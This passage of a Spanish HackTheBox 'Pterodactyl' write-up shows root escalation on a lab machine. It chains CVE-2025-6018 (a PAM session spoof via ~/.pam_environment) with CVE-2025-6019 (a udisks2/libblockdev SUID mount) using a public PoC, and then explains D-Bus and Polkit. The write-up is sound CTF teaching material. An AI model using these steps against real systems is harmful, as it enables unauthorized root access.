+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>sudo<span style="color:#f92672">]</span> password <span style="color:#66d9ef">for</span> root:</span></span></code></pre></div></div>
+<p>Y no funciona, tenemos que buscar otra vía.</p>
+
+<h3 class="relative group">Analizando programas instalados con Trivy
+    <div id="analizando-programas-instalados-con-trivy" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#analizando-programas-instalados-con-trivy" aria-label="Ancla">#</a>
+    </span>
+    
+</h3>
+<p>Tras haber buscado binarios con SUID, cronjobs, permisos sudo, servicios en ejecución, archivos con credenciales que podamos leer, haber ejecutado linPEAS y más, seguimos sin encontrar nada que nos permita elevar privilegios.</p>
+<p>No quedan muchas alternativas, pero podemos mirar qué paquetes hay instalados por si hay alguno vulnerable:</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>~&gt; rpm -qa
+</span></span><span style="display:flex;"><span>plymouth-lang-22.02.122+94.4bd41a3-150600.3.6.1.noarch
+</span></span><span style="display:flex;"><span>libbpf1-1.2.2-150600.3.6.2.x86_64
+</span></span><span style="display:flex;"><span>libyui16-4.5.3-150600.6.2.1.x86_64
+</span></span><span style="display:flex;"><span>hicolor-icon-theme-0.17-150600.19.2.noarch
+</span></span><span style="display:flex;"><span>... <span style="color:#75715e"># En total 886 paquetes</span></span></span></code></pre></div></div>
+<p>Con casi 900 paquetes instalados es inviable analizarlos manualmente, pero sí podemos usar un escáner automático como <code>trivy</code> para hacer el trabajo:</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>/tmp/triv&gt; ./trivy rootfs /
+</span></span><span style="display:flex;"><span>2026-02-28T20:31:48+02:00	INFO	<span style="color:#f92672">[</span>vulndb<span style="color:#f92672">]</span> Need to update DB
+</span></span><span style="display:flex;"><span>2026-02-28T20:31:48+02:00	INFO	<span style="color:#f92672">[</span>vulndb<span style="color:#f92672">]</span> Downloading vulnerability DB...
+</span></span><span style="display:flex;"><span>2026-02-28T20:31:48+02:00	INFO	<span style="color:#f92672">[</span>vulndb<span style="color:#f92672">]</span> Downloading artifact...	repo<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;mirror.gcr.io/aquasec/trivy-db:2&#34;</span>
+</span></span><span style="display:flex;"><span>2026-02-28T20:31:52+02:00	FATAL	Fatal error	run error: init error: DB error: failed to download vulnerability DB: OCI artifact error: failed to download vulnerability DB: failed to download artifact from mirror.gcr.io/aquasec/trivy-db:2: OCI repository error: <span style="color:#ae81ff">1</span> error occurred:
+</span></span><span style="display:flex;"><span>	* Get <span style="color:#e6db74">&#34;https://mirror.gcr.io/v2/&#34;</span>: dial tcp: lookup mirror.gcr.io on <span style="color:#f92672">[</span>::1<span style="color:#f92672">]</span>:53: dial udp <span style="color:#f92672">[</span>::1<span style="color:#f92672">]</span>:53: connect: cannot assign requested address</span></span></code></pre></div></div>
+<p>Trivy necesita descargar su DB, pero la máquina no tiene acceso a Internet, así que la descargamos localmente en nuestra máquina y la comprimimos para subirla:</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ trivy image --download-db-only
+</span></span><span style="display:flex;"><span>2026-02-28T13:36:43-05:00	INFO	<span style="color:#f92672">[</span>vulndb<span style="color:#f92672">]</span> Artifact successfully downloaded	repo<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;mirror.gcr.io/aquasec/trivy-db:2&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$ tar -czvf trivy-db.tar.gz -C ~/.cache/trivy db
+</span></span><span style="display:flex;"><span>db/
+</span></span><span style="display:flex;"><span>db/trivy.db
+</span></span><span style="display:flex;"><span>db/metadata.json</span></span></code></pre></div></div>
+<p>Y ya con el binario de <code>trivy</code> en la víctima, descargamos la db también:</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>/tmp/triv&gt; ls
+</span></span><span style="display:flex;"><span>contrib  LICENSE  README.md  trivy  trivy.tar
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>/tmp/triv&gt; wget http://10.10.15.95:8000/trivy-db.tar.gz
+</span></span><span style="display:flex;"><span>Connecting to 10.10.15.95:8000... connected.
+</span></span><span style="display:flex;"><span>HTTP request sent, awaiting response... <span style="color:#ae81ff">200</span> OK
+</span></span><span style="display:flex;"><span>Length: <span style="color:#ae81ff">90801132</span> <span style="color:#f92672">(</span>87M<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>application/gzip<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>Saving to: ‘trivy-db.tar.gz’
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>trivy-db.tar.gz     100%<span style="color:#f92672">[===============================================================</span>&gt;<span style="color:#f92672">]</span> 86.59M 6.70MB/s in 17s
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>/tmp/triv&gt; tar -xzvf trivy-db.tar.gz 
+</span></span><span style="display:flex;"><span>db/
+</span></span><span style="display:flex;"><span>db/trivy.db
+</span></span><span style="display:flex;"><span>db/metadata.json</span></span></code></pre></div></div>
+<p>Ahora ejecutamos y buscamos vulnerabilidades en el fs raíz, (<code>rootfs</code>), en modo offline y usando nuestra db descargada (<code>--offline-scan --cache-dir /tmp/triv/</code>), que sean CRITICAL o HIGH (<code>--severity CRITICAL,HIGH</code>) y de paquetes del SO (<code>--vuln-type os</code>). Luego filtramos por privesc (<code>grep &quot;privilege esc&quot;</code>), ordenamos y quitamos repetidos (<code>sort -u</code>):</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>/tmp/triv&gt; ./trivy rootfs --offline-scan --cache-dir /tmp/triv/ --scanners vuln --severity CRITICAL,HIGH --format json --vuln-type os / 2&gt;/dev/null | grep <span style="color:#e6db74">&#34;privilege esc&#34;</span> | sort -u
+</span></span><span style="display:flex;"><span>          <span style="color:#e6db74">&#34;Description&#34;</span>: <span style="color:#e6db74">&#34;This update for libblockdev fixes the following issues:\n\n- CVE-2025-6019: Suppress privilege escalation during xfs fs resize (bsc#1243285).\n&#34;</span>,
+</span></span><span style="display:flex;"><span>          <span style="color:#e6db74">&#34;Description&#34;</span>: <span style="color:#e6db74">&#34;This update for open-vm-tools fixes the following issues:\n- CVE-2025-41244: fixed a local privilege escalation vulnerability (bnc#1250373).\n&#34;</span>,</span></span></code></pre></div></div>
+<p>Y tenemos 2 vulnerabilidades, una de <code>open-vm-tools</code> y otra de <code>libblockdev</code> (Udisks2). Posiblemente la de <code>open-vm-tools</code> tenga que ver con que la propia máquina es una VM (como el resto de máquinas de HTB), así que lo que queda es el <code>CVE-2025-6019</code>.</p>
+
+<h3 class="relative group">CVE-2025-6019
+    <div id="cve-2025-6019" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#cve-2025-6019" aria-label="Ancla">#</a>
+    </span>
+    
+</h3>
+<blockquote><p><em>Se trata de un fallo de seguridad en el modo en que libblockdev interactúa con udisks2 al redimensionar sistemas de archivos, lo que permite ejecutar código con privilegios de root a través de un sistema de archivos especialmente preparado. El atacante crea una imagen XFS que contiene un binario SUID con permisos de root y engaña a udisks para montarla sin las protecciones habituales (al redimensionarla), ejecutando así el shell SUID.</em></p>
+</blockquote><p>Encontramos <a href="https://github.com/MichaelVenturella/CVE-2025-6018-6019-PoC"  target="_blank" rel="noreferrer">este exploit</a> público, lo descargamos y subimos a la máquina. Al ejecutarlo:</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>phileasfogg3@pterodactyl:/tmp&gt; ./exploit.sh 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Session is Active. Polkit bypass enabled.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Starting Background Trigger <span style="color:#f92672">(</span>Wait 2s<span style="color:#f92672">)</span>...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Starting Foreground Catcher...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> HOLD TIGHT. ROOT SHELL INCOMING.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Sniper started. Waiting <span style="color:#66d9ef">for</span> ANY loop mount...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#f92672">(</span>BG<span style="color:#f92672">)</span> Setting up loop device...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">====</span> AUTHENTICATING FOR org.freedesktop.udisks2.loop-setup <span style="color:#f92672">====</span>
+</span></span><span style="display:flex;"><span>Authentication is required to set up a loop device
+</span></span><span style="display:flex;"><span>Authenticating as: root
+</span></span><span style="display:flex;"><span>Password: <span style="color:#75715e">#CTRL+C</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>BG<span style="color:#f92672">)</span> Loop setup failed:</span></span></code></pre></div></div>
+<p>No ha funcionado, pero, por suerte, en el propio PoC se contemplaba esta posibilidad y se indica que puede solucionarse de forma fácil:</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>phileasfogg3@pterodactyl:/tmp&gt; echo <span style="color:#e6db74">&#34;XDG_SEAT=seat0&#34;</span> &gt; ~/.pam_environment
+</span></span><span style="display:flex;"><span>phileasfogg3@pterodactyl:/tmp&gt; echo <span style="color:#e6db74">&#34;XDG_VTNR=1&#34;</span> &gt;&gt; ~/.pam_environment
+</span></span><span style="display:flex;"><span>phileasfogg3@pterodactyl:/tmp&gt; exit
+</span></span><span style="display:flex;"><span>logout
+</span></span><span style="display:flex;"><span>Connection to pterodactyl.htb closed.</span></span></code></pre></div></div>
+<p>Luego nos reconectamos</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ ssh phileasfogg3@pterodactyl.htb
+</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>phileasfogg3@pterodactyl.htb<span style="color:#f92672">)</span> Password: 
+</span></span><span style="display:flex;"><span>Have a lot of fun...
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>phileasfogg3@pterodactyl:~&gt; cd /tmp
+</span></span><span style="display:flex;"><span>phileasfogg3@pterodactyl:/tmp&gt; loginctl show-session $XDG_SESSION_ID | grep Active
+</span></span><span style="display:flex;"><span>Active<span style="color:#f92672">=</span>yes
+</span></span><span style="display:flex;"><span>phileasfogg3@pterodactyl:/tmp&gt; ./exploit.sh 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Session is Active. Polkit bypass enabled.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Starting Background Trigger <span style="color:#f92672">(</span>Wait 2s<span style="color:#f92672">)</span>...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Starting Foreground Catcher...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> HOLD TIGHT. ROOT SHELL INCOMING.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Sniper started. Waiting <span style="color:#66d9ef">for</span> ANY loop mount...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#f92672">(</span>BG<span style="color:#f92672">)</span> Setting up loop device...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#f92672">(</span>BG<span style="color:#f92672">)</span> Triggering Resize on /org/freedesktop/UDisks2/block_devices/loop0...
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!!!<span style="color:#f92672">]</span> HIT! Mounted at: /tmp/blockdev.NTXKL3
+</span></span><span style="display:flex;"><span>pterodactyl:/tmp# whoami
+</span></span><span style="display:flex;"><span>root</span></span></code></pre></div></div>
+<p>Y tenemos root.</p>
+
+<h2 class="relative group">Post-Root: CVE, D-Bus y Polkit.
+    <div id="post-root-cve-d-bus-y-polkit" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#post-root-cve-d-bus-y-polkit" aria-label="Ancla">#</a>
+    </span>
+    
+</h2>
+<p>Tras ejecutar el PoC del <code>CVE-2025-6019</code> y conseguir el shell como root, surgen varias preguntas:</p>
+<blockquote><p><em><strong>Cómo es posible que estemos explotando una vulnerabilidad que nos permita llegar a ser root en un programa que ni podemos ejecutar como root (no tenemos permisos sudo ni hay SUID bit o capabilities), ni se está ejecutando como root (no aparece al usar <code>ps aux</code>)?</strong></em></p>
+</blockquote><p>La respuesta es el <a href="https://en.wikipedia.org/wiki/D-Bus"  target="_blank" rel="noreferrer"><strong>D-Bus</strong></a>. En Linux, los procesos están aislados por seguridad, y si un proceso necesita hacer algo importante, no puede hacerlo directamente, necesita pedírselo al sistema. El D-Bus es el sistema de mensajería interna (IPC) de Linux que permite que los procesos se comuniquen entre sí. Los servicios pueden registrarse en los D-Bus y exponer funcionalidades y señales y permitir que otros procesos las soliciten. Al registrarse, también pueden pedir que el sistema les &ldquo;despierte&rdquo; cuando llegue una señal específica al D-Bus.</p>
+<p>En Linux hay un <strong>System D-Bus</strong> (global para la máquina) y otro <strong>Session D-Bus</strong> para cada sesión de usuario (con servicios no root).</p>
+<p>Podemos ver qué servicios hay registrado en el <strong>System</strong> D-Bus con <code>busctl list</code> (para el D-Bus de la sesión actual sería <code>busctl --user list</code>):</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>~&gt; busctl list
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># *** Output de ANTES de ejecutar el exploit del CVE. ***</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>NAME                           PID PROCESS        USER         CONNECTION    UNIT                   SESSION DESCRIPTION
+</span></span><span style="display:flex;"><span>:1.0                             <span style="color:#ae81ff">1</span> systemd        root         :1.0          init.scope             -       -          
+</span></span><span style="display:flex;"><span>:1.1                           <span style="color:#ae81ff">797</span> systemd-logind root         :1.1          systemd-logind.service -       -          
+</span></span><span style="display:flex;"><span>:1.12                         <span style="color:#ae81ff">1000</span> polkitd        polkitd      :1.12         polkit.service         -       -          
+</span></span><span style="display:flex;"><span>:1.15                          <span style="color:#ae81ff">937</span> wickedd        root         :1.15         wickedd.service        -       -          
+</span></span><span style="display:flex;"><span>:1.187                       <span style="color:#ae81ff">11484</span> busctl         phileasfogg3 :1.187        session-6.scope        <span style="color:#ae81ff">6</span>       -          
+</span></span><span style="display:flex;"><span>:1.2                           <span style="color:#ae81ff">758</span> firewalld      root         :1.2          firewalld.service      -       -         
+</span></span><span style="display:flex;"><span>:1.3                           <span style="color:#ae81ff">925</span> wickedd-auto4  root         :1.3          wickedd-auto4.service  -       -          
+</span></span><span style="display:flex;"><span>:1.4                           <span style="color:#ae81ff">930</span> wickedd-dhcp6  root         :1.4          wickedd-dhcp6.service  -       -          
+</span></span><span style="display:flex;"><span>:1.45                        <span style="color:#ae81ff">10362</span> systemd        phileasfogg3 :1.45         user@1002.service      -       -          
+</span></span><span style="display:flex;"><span>:1.5                           <span style="color:#ae81ff">929</span> wickedd-dhcp4  root         :1.5          wickedd-dhcp4.service  -       -          
+</span></span><span style="display:flex;"><span>:1.6                           <span style="color:#ae81ff">937</span> wickedd        root         :1.6          wickedd.service        -       -          
+</span></span><span style="display:flex;"><span>:1.7                           <span style="color:#ae81ff">947</span> wickedd-nanny  root         :1.7          wickedd-nanny.service  -       -          
+</span></span><span style="display:flex;"><span>:1.8                           <span style="color:#ae81ff">947</span> wickedd-nanny  root         :1.8          wickedd-nanny.service  -       -          
+</span></span><span style="display:flex;"><span>org.fedoraproject.FirewallD1   <span style="color:#ae81ff">758</span> firewalld      root         :1.2          firewalld.service      -       -          
+</span></span><span style="display:flex;"><span>org.freedesktop.DBus             <span style="color:#ae81ff">1</span> systemd        root         -             init.scope             -       -          
+</span></span><span style="display:flex;"><span>org.freedesktop.PolicyKit1    <span style="color:#ae81ff">1000</span> polkitd        polkitd      :1.12         polkit.service         -       -          
+</span></span><span style="display:flex;"><span>org.freedesktop.UDisks2          - -              -            <span style="color:#f92672">(</span>activatable<span style="color:#f92672">)</span> -                      -       -          
+</span></span><span style="display:flex;"><span>org.freedesktop.hostname1        - -              -            <span style="color:#f92672">(</span>activatable<span style="color:#f92672">)</span> -                      -       -          
+</span></span><span style="display:flex;"><span>org.freedesktop.locale1          - -              -            <span style="color:#f92672">(</span>activatable<span style="color:#f92672">)</span> -                      -       -          
+</span></span><span style="display:flex;"><span>org.freedesktop.login1         <span style="color:#ae81ff">797</span> systemd-logind root         :1.1          systemd-logind.service -       -          
+</span></span><span style="display:flex;"><span>org.freedesktop.systemd1         <span style="color:#ae81ff">1</span> systemd        root         :1.0          init.scope             -       -          
+</span></span><span style="display:flex;"><span>org.freedesktop.timedate1        - -              -            <span style="color:#f92672">(</span>activatable<span style="color:#f92672">)</span> -                      -       -          
+</span></span><span style="display:flex;"><span>org.freedesktop.timesync1        - -              -            <span style="color:#f92672">(</span>activatable<span style="color:#f92672">)</span> -                      -       -          
+</span></span><span style="display:flex;"><span>org.opensuse.Network           <span style="color:#ae81ff">937</span> wickedd        root         :1.6          wickedd.service        -       -          
+</span></span><span style="display:flex;"><span>org.opensuse.Network.AUTO4     <span style="color:#ae81ff">925</span> wickedd-auto4  root         :1.3          wickedd-auto4.service  -       -          
+</span></span><span style="display:flex;"><span>org.opensuse.Network.DHCP4     <span style="color:#ae81ff">929</span> wickedd-dhcp4  root         :1.5          wickedd-dhcp4.service  -       -          
+</span></span><span style="display:flex;"><span>org.opensuse.Network.DHCP6     <span style="color:#ae81ff">930</span> wickedd-dhcp6  root         :1.4          wickedd-dhcp6.service  -       -          
+</span></span><span style="display:flex;"><span>org.opensuse.Network.Nanny     <span style="color:#ae81ff">947</span> wickedd-nanny  root         :1.7          wickedd-nanny.service  -       -          
+</span></span><span style="display:flex;"><span>org.opensuse.Snapper             - -              -            <span style="color:#f92672">(</span>activatable<span style="color:#f92672">)</span> - </span></span></code></pre></div></div>
+<p>Si nos fijamos, entre todo esto, vemos la siguiente línea:</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>NAME                           PID PROCESS        USER         CONNECTION    UNIT                   SESSION DESCRIPTION
+</span></span><span style="display:flex;"><span>org.freedesktop.UDisks2          - -              -            <span style="color:#f92672">(</span>activatable<span style="color:#f92672">)</span> -                      -       -          </span></span></code></pre></div></div>
+<p>UDisks2 era el servicio vulnerable, y antes de ejecutar el exploit, su <code>CONNECTION</code> está puesta a <code>(activatable)</code>, en lugar de tener un ID como el resto de servicios del D-Bus. Tampoco tiene un PID ni un usuario asociado. Esto se debe a que, aunque el servicio está registrado en el D-Bus, no está activo, ni siquiera tiene un proceso vivo, <em>por eso no veíamos nada relacionado con UDisks2 al usar <code>ps aux</code></em>.</p>
+<p>Como UDisks2 es un programa que opera con discos y particiones (cosa que no siempre se usa), el servicio pasa la mayor parte del tiempo inactivo, pero registrado en el D-Bus y a la espera de que un programa le mande una señal que haga que se despierte, de ahí el <code>(activatable)</code>. Cuando alguien mande un mensaje a <code>org.freedesktop.UDisks2</code>, D-Bus le dirá a <code>systemd</code> que inicie el binario de UDisks2, le asigne un PID y usuario y procese la petición, de ahí que pueda hacer cosas como root.</p>
+<p>Y es exactamente por eso que, tras haber ejecutado el exploit, si volvemos a mirar:</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>NAME                           PID PROCESS        USER         CONNECTION    UNIT                   SESSION DESCRIPTION
+</span></span><span style="display:flex;"><span>org.freedesktop.UDisks2      <span style="color:#ae81ff">13843</span> udisksd        root         :1.461        udisks2.service        -       -          </span></span></code></pre></div></div>
+<p>Ya existe un proceso por debajo.</p>
+<blockquote><p><em><strong>Ahora que sabemos por qué no lo veíamos antes y cómo y por qué el programa se despertaba (y que lo hacía como root), cómo funcionaba el CVE?</strong></em></p>
+</blockquote><p>Partimos de que UDisks2 es un servicio y una herramienta de Linux que permite gestionar dispositivos de almacenamiento como HDDs, SSDs y demás. Ofrece, como hemos dicho, una interfaz en el D-Bus para que los programas puedan montar y desmontar particiones o formatear discos (entre otros) sin necesidad de ser root.</p>
+<p>En UDisks2, cuando un usuario solicita redimensionar un sistema de archivos <a href="https://es.wikipedia.org/wiki/XFS"  target="_blank" rel="noreferrer">XFS</a>, <code>udisks</code> cede la tarea a la biblioteca <code>libblockdev</code> (la que ha detectado Trivy). Para redimensionar el fs., <code>libblockdev</code> necesita montarlo temporalmente en <code>/tmp</code>. La vulnerabilidad consiste en que ese montaje temporal se realiza sin aplicar flags de seguridad como <code>nosuid</code> (que hace que los binarios del fs. con el bit SUID/SGID no tengan tal efecto en el sistema global).</p>
+<p>Aprovechando ese fallo, un atacante puede preparar un exploit como el sacado de Github, que contenía 4 archivos:</p>
+<ul>
+<li><code>build_poc.sh</code>: Compila localmente <code>catcher</code> y crea <code>exploit.img</code> para subirlos al server de la víctima después.</li>
+<li><code>exploit.sh</code>: Solicita a UDisks2 que redimensiona <code>exploit.img</code> e inmediatamente después inicia el <code>catcher</code>.</li>
+<li><code>exploit.img</code>: Imagen XFS maliciosa con un binario bash con SUID bit puesto.</li>
+<li><code>catcher</code>: Se mantiene a la escucha hasta que <code>libblockdev</code> monta la imagen para redimensionarla (sin el <code>nosuid</code>)</li>
+</ul>
+<p>Al ejecutar <code>exploit.sh</code>, este pide a UDisks2 que redimensione la imagen. El <code>catcher</code> se mantiene en escucha y cuando ve que <code>libblockdev</code> ha montado el fs., inmediatamente ejecuta el shell bash con SUID que había dentro.</p>
+<blockquote><p><em><strong>Por qué ha fallado la primera vez? En qué consistía la solución?</strong></em></p>
+</blockquote><p>Aquí entra en juego <a href="https://en.wikipedia.org/wiki/Polkit"  target="_blank" rel="noreferrer">Polkit</a>, otro sistema (que también veíamos en el D-Bus como <code>org.freedesktop.PolicyKit1</code>) encargado de controlar las autorizaciones (quién puede hacer qué). Permite establecer reglas estrictas para cada usuario sin necesidad de ejecutar todo el programa como root.</p>
+<p>El proceso de funcionamiento de Polkit es el siguiente (p.ej para añadir una impresora):</p>
+<ol>
+<li>La aplicación de config. manda un mensaje por D-Bus a CUPS, solicitando añadir una impresora</li>
+<li>CUPS recibe la solicitud y sabe que añadir una impresora requiere permisos especiales, pero no sabe si el usuario los tiene.</li>
+<li>CUPS <strong>pregunta a Polkit</strong> (via D-Bus): &ldquo;<em>El usuario X quiere hacer Y acción, debería dejarle?</em>&rdquo;</li>
+<li>Polkit revisa sus reglas guardadas en <code>/etc/polkit-1/rules.d/</code> o <code>/usr/share/polkit-1/actions/</code>, de ahí puede ver varias cosas:</li>
+</ol>
+<ul>
+<li>Sí, el usuario tiene permiso, CUPS puede añadir la impresora.</li>
+<li>No, el usuario no tiene permiso, CUPS no debería añadir la impresora (aunque CUPS puede ignorarle)</li>
+<li>Autenticación Requerida: Puede, pero debe autenticarse (se pide contraseña y se delega la comprobación a PAM).</li>
+</ul>
+<ol start="5">
+<li>En función de lo recibido, CUPS hará una cosa u otra</li>
+</ol>
+<p>Cuando lo que se quiere es montar o trabajar con discos, la política de Polkit es clara:</p>
+<ul>
+<li>Si un usuario está conectado por SSH, se le considera &ldquo;sesión inactiva&rdquo; y se requiere que introduzca la contraseña de root para interactuar con el hardware. Por eso cuando se ha intentado crear el disco para redimensionarlo, Polkit nos ha parado.</li>
+</ul>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>phileasfogg3@pterodactyl:/tmp&gt; ./exploit.sh 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Session is Active. Polkit bypass enabled.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Starting Background Trigger <span style="color:#f92672">(</span>Wait 2s<span style="color:#f92672">)</span>...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Starting Foreground Catcher...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> HOLD TIGHT. ROOT SHELL INCOMING.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Sniper started. Waiting <span style="color:#66d9ef">for</span> ANY loop mount...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#f92672">(</span>BG<span style="color:#f92672">)</span> Setting up loop device...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">====</span> AUTHENTICATING FOR org.freedesktop.udisks2.loop-setup <span style="color:#f92672">====</span>
+</span></span><span style="display:flex;"><span>Authentication is required to set up a loop device
+</span></span><span style="display:flex;"><span>Authenticating as: root
+</span></span><span style="display:flex;"><span>Password: <span style="color:#75715e">#... Pide contraseña de root</span></span></span></code></pre></div></div>
+<p>Para solucionar esto, hemos tenido que añadir 2 variables a <code>~/.pam_environment</code>:</p>
+<ul>
+<li><code>XDG_SEAT=seat0</code>: Indica el &ldquo;contexto de hardware&rdquo;, <code>seat0</code> hace referencia a teclado y ratón físicos.</li>
+<li><code>XDG_VTNR=1</code>: Indica número de terminal. Se pone <code>tty1</code> en este caso, que hace referencia a la terminal común para logins GUI.</li>
+</ul>
+<p>Estas dos variables en el archivo explotan otra vulnerabilidad (<code>CVE-2025-6018</code>) que engaña a PAM para que marque la sesión remota por SSH como una sesión activa:</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>~&gt; loginctl show-session $XDG_SESSION_ID | grep Active
+</span></span><span style="display:flex;"><span>Active<span style="color:#f92672">=</span>yes</span></span></code></pre></div></div>
+<p>Esto hace que, al ejecutar el exploit, Polkit no nos pare a mitad, permitiéndonos cargar el filesystem con el binario de bash y finalmente obtener un shell como root.</p>
+
+          
+          
+          
+        </div>
+        
+        
+
+        
+  
+  <section class="flex flex-row flex-wrap justify-center pt-4 text-xl">
+    
+      
+        
+        <a
+          class=" m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
+          target="_blank"
+          href="https://www.linkedin.com/shareArticle?mini=true&amp;url=http://localhost:1313/writeups/pterodactyl/&amp;title=HackTheBox%20-%20Pterodactyl"
+          
+          title="Compartir en LinkedIn"
+          aria-label="Compartir en LinkedIn">
